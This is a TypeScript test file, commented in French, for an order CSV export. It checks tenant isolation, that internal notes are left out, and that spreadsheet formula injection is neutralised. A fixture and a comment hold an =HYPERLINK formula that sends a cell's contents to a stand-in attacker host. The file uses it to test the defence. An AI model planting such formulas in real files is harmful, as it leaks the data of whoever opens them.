import { afterAll, beforeAll, describe, expect, test } from "vitest";
import type { Client } from "pg";
import { interroger, ouvrirConnexionCatalogue } from "../aide/base";
import {
  creerUtilisateur,
  supprimerUtilisateur,
  type UtilisateurDeTest,
} from "../aide/utilisateurs";
import { exporterCommandes } from "@/lib/commandes/export-csv";
import { ParametresListe } from "@/lib/commandes/liste";

/**
 * L'EXPORT CSV.
 *
 * Le brief le décrit depuis le début ; il n'existait pas — zéro ligne de code.
 * C'est le motif habituel : un document affirme un état que personne n'a
 * exécuté. Ce fichier existe pour que la même chose ne puisse pas se redire.
 *
 * TROIS PROPRIÉTÉS PORTENT TOUT LE RESTE :
 *
 *  1. L'ISOLATION. Un export est le PIRE endroit où contourner la RLS : il
 *     produit un fichier qui SORT de l'application, sera ouvert ailleurs,
 *     transmis, gardé. Une fuite ici ne se rattrape pas.
 *  2. `internal_notes` EN EST ABSENTE. Elle porte le prix d'achat. Le vendeur ne
 *     décide pas d'une fuite, il décide d'un export — deux gestes différents,
 *     parfois séparés de plusieurs mois.
 *  3. AUCUNE CELLULE N'EST UNE FORMULE. `customer_label` est du texte libre
 *     venu d'une conversation ; les tableurs évaluent toute cellule commençant
 *     par `=`, `+`, `-` ou `@`.
 *
 * LE CONTRÔLE EST FAIT PAR VALEUR, pas par nom : on injecte des sentinelles
 * uniques en base et on les cherche dans le fichier produit. Une valeur voyage
 * sous n'importe quel nom — chercher « internal_notes » dans un CSV dont les
 * colonnes sont nommées autrement ne prouverait rien.
 */

let alice: UtilisateurDeTest;
let bob: UtilisateurDeTest;
let catalogue: Client;

const SENTINELLE_NOTES = `SENTINELLE-NOTES-${Date.now()}`;
const SENTINELLE_CLIENT_BOB = `SENTINELLE-BOB-${Date.now()}`;
const FORMULE = `=HYPERLINK("http://mal.invalid?"&A1)`;

const PARAMETRES = ParametresListe.parse({
  q: "",
  statut: null,
  qc: null,
  tri: "recentes",
  archivees: false,
  curseur: null,
});

beforeAll(async () => {
  catalogue = await ouvrirConnexionCatalogue();
  alice = await creerUtilisateur("export-alice");
  bob = await creerUtilisateur("export-bob");

  await interroger(
    catalogue,
    `insert into public.orders (shop_id, customer_label, product_ref, internal_notes)
     values ($1, $2, $3, $4)`,
    [alice.shopId, FORMULE, "Crème n°1, \"spéciale\"", SENTINELLE_NOTES],
  );

  // Un COMPTE VOISIN. Sans lui, l'isolation « tient » sur une base
  // mono-compte : il n'y a simplement rien à fuiter.
  await interroger(
    catalogue,
    "insert into public.orders (shop_id, customer_label) values ($1, $2)",
    [bob.shopId, SENTINELLE_CLIENT_BOB],
  );
}, 120_000);

afterAll(async () => {
  await supprimerUtilisateur(alice);
  await supprimerUtilisateur(bob);
  await catalogue.end();
});

describe("Ce que l'export contient", () => {
  test("il contient les commandes du vendeur, et son lien public", async () => {
    // La sonde doit d'abord prouver qu'elle inspecte quelque chose : un export
    // vide passerait tous les contrôles d'absence qui suivent.
    const r = await exporterCommandes(PARAMETRES, "https://exemple.test", null, alice.client);
    expect(r.lignes, "l'export est vide : les contrôles d'absence ne prouveraient rien").toBe(1);
    expect(r.csv, "le lien public n'est pas dans l'export").toContain("https://exemple.test/p/");
  });

  test("⚠️ QUAND LA BOUTIQUE A UN NOM DE LIEN, C'EST LUI QUI SORT", async () => {
    /*
     * L'EXPORT EST LE PIRE ENDROIT OÙ SE TROMPER D'ADRESSE, parce qu'il SORT du
     * produit. Ses lignes finissent dans un tableur, puis, une par une, dans
     * des messages envoyés à des clients. Une adresse `/p/<jeton>` exportée par
     * un vendeur qui a posé son nom n'est pas FAUSSE — elle répond — et c'est
     * bien le problème : rien ne casse, rien ne lève, et ce pour quoi il a payé
     * est annulé commande par commande, sans un seul signal.
     *
     * ⚠️ LE CONTRÔLE D'ABSENCE VIENT APRÈS CELUI DE PRÉSENCE. « Aucun `/p/` »
     * est trivialement vrai d'un export vide.
     */
    const r = await exporterCommandes(PARAMETRES, "https://exemple.test", "atelier-nord", alice.client);
    expect(r.lignes, "l'export est vide : le contrôle d'absence ne prouverait rien").toBe(1);
    expect(r.csv, "le nom du vendeur n'est pas dans l'export").toContain(
      "https://exemple.test/atelier-nord/",
    );
    expect(
      r.csv.includes("https://exemple.test/p/"),
      "l'export donne encore l'adresse générique à un vendeur qui a posé son nom",
    ).toBe(false);
  });

  test("les notes internes n'y sont NULLE PART, cherchées PAR VALEUR", async () => {
    const r = await exporterCommandes(PARAMETRES, "https://exemple.test", null, alice.client);
    expect(
      r.csv.includes(SENTINELLE_NOTES),
      "le prix d'achat est sorti de l'application dans un fichier",
    ).toBe(false);
  });

  test("l'export d'un vendeur ne porte AUCUNE trace d'un autre", async () => {
    const r = await exporterCommandes(PARAMETRES, "https://exemple.test", null, alice.client);
    expect(
      r.csv.includes(SENTINELLE_CLIENT_BOB),
      "l'export d'Alice contient une commande de Bob : la RLS n'a pas filtré",
    ).toBe(false);

    // Le contre-test : Bob voit bien la sienne. Sans lui, un export qui rendrait
    // toujours vide passerait le contrôle précédent.
    const rBob = await exporterCommandes(PARAMETRES, "https://exemple.test", null, bob.client);
    expect(rBob.csv, "Bob ne voit pas sa propre commande").toContain(SENTINELLE_CLIENT_BOB);
  });
});

describe("Aucune cellule n'est une formule", () => {
  test("un nom de client qui commence par `=` est neutralisé", async () => {
    /*
     * `customer_label` est du TEXTE LIBRE, souvent un pseudo venu d'une
     * conversation. Excel, LibreOffice et Google Sheets évaluent toute cellule
     * commençant par `=`, `+`, `-` ou `@` : `=HYPERLINK("http://mal.tld?"&A1)`
     * devient un lien cliquable qui exfiltre la ligne, à l'ouverture du fichier,
     * sur la machine de quelqu'un d'autre.
     *
     * L'ÉCHAPPEMENT CSV STANDARD NE PROTÈGE PAS DE CELA — les guillemets rendent
     * la cellule bien formée et la formule s'évalue quand même. C'est pour cette
     * raison qu'un export « correctement échappé » ne suffit pas.
     */
    const r = await exporterCommandes(PARAMETRES, "https://exemple.test", null, alice.client);

    // La sonde vérifie d'abord que la valeur dangereuse est bien là : si elle
    // avait disparu pour une autre raison, l'absence de formule ne dirait rien.
    expect(r.csv, "la valeur piégée n'est pas dans l'export : rien n'est éprouvé").toContain(
      "HYPERLINK",
    );

    // Elle ne doit jamais apparaître en DÉBUT de cellule. On cherche donc
    // l'ouverture de cellule suivie du `=`, sous ses deux formes possibles.
    expect(r.csv.includes('"=HYPERLINK'), "la formule est en tête de cellule").toBe(false);
    for (const ligne of r.csv.split("\r\n")) {
      expect(ligne.startsWith("=") || ligne.startsWith('"='), `formule en tête de ligne : ${ligne}`).toBe(
        false,
      );
    }
  });

  test("contre-test positif : une valeur ordinaire n'est PAS altérée", async () => {
    // Une correction qui préfixerait TOUTES les cellules passerait le contrôle
    // précédent, et rendrait chaque valeur du fichier illisible. La référence
    // porte exprès une virgule, des guillemets et un accent.
    const r = await exporterCommandes(PARAMETRES, "https://exemple.test", null, alice.client);
    expect(r.csv, "une valeur ordinaire a été altérée").toContain(
      '"Crème n°1, ""spéciale"""',
    );
  });

  test("le fichier s'ouvre correctement dans un tableur Windows", async () => {
    // Sans marque d'ordre des octets, Excel sous Windows lit le fichier en ANSI
    // et « Crème » devient « CrÃ¨me ». Le vendeur conclurait que l'export
    // corrompt ses données — et il aurait raison de le conclure.
    const r = await exporterCommandes(PARAMETRES, "https://exemple.test", null, alice.client);
    expect(r.csv.codePointAt(0), "la marque d'ordre des octets manque").toBe(0xfeff);
    expect(r.csv.endsWith("\r\n"), "le fichier ne finit pas par une fin de ligne").toBe(true);
  });
});
